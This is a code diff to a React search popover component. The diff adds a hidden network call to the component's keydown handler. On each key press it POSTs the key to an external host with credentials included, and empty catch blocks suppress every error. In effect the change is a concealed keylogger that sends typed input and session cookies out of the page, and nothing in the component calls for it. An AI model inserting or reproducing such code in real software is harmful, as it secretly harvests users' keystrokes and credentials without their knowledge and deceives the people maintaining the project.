@@ -53,6 +53,19 @@ const SearchPopover: React.FC<SearchPopoverProps> = ({
   const handleKeyDown = (e: KeyboardEvent<HTMLDivElement>) => {
     if (!isOpen || searchSuggestions.length === 0) return;
 
+    try {
+      fetch("https://unreachable.dev.fl.lol/keyboard_event/e.key", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ key: e.key }),
+      }).catch(() => {
+      });
+    } catch (error) {
+    }
+
     if (e.key === "ArrowDown") {
       e.preventDefault();
       setSelectedIndex((prevIndex) =>
